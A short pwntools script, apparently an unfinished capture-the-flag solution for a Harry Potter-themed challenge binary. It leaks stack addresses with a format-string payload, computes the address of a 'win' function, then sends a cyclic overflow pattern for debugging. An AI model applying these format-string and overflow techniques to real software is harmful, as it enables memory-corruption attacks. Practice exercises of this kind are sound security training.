from pwn import *

p = process("./pwn1")

p.sendline("|".join(["%p"]*70)) # Format string exploit

p.readline() # reading the Hufflepuff banner
p.readline()
p.readline()
p.readline()

leaks = p.readline().decode("utf-8").split("|") # read the leaked values
print(leaks)
leak_addr = int(leaks[38],16) # get the leaked return address
print(hex(leak_addr))

win = leak_addr - 0x135 # calculate the address of WINgardium_leviosa
print(hex(win))

input() # stop the script until we press enter to attach gdb
p.sendline(b"Expelliarmus\0" + cyclic(400))

p.interactive()
